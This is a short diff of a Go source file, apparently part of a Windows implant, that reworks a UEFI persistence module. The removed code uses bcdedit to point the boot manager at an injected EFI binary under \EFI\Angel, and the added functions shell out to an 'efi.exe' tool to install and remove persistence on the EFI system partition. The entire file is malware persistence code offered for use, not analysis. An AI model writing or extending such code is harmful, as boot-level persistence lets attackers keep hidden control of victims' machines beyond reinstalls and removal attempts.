@@ -1,22 +1,25 @@
-package windows
+//go:build windows
+
+package persistence
 
 import (
 "os/exec"
 )
 
-type UEFIPersistence struct{}
-
-func NewUEFIPersistence() *UEFIPersistence {
-return &UEFIPersistence{}
+func UEFIPersist() bool {
+cmd := exec.Command("cmd", "/c", "efi.exe esp-persist")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (u *UEFIPersistence) InjectDXE(path string) error {
-// In real implementation, would use UEFI tools
-cmd := exec.Command("bcdedit", "/set", "{bootmgr}", "path", path)
-return cmd.Run()
+func UEFIRemove() bool {
+cmd := exec.Command("cmd", "/c", "efi.exe esp-remove")
+err := cmd.Run()
+if err != nil {
+return false
 }
-
-func (u *UEFIPersistence) ModifyBootManager() error {
-cmd := exec.Command("bcdedit", "/set", "{globalsettings}", "path", "\\EFI\\Angel\\boot.efi")
-return cmd.Run()
+return true
 }
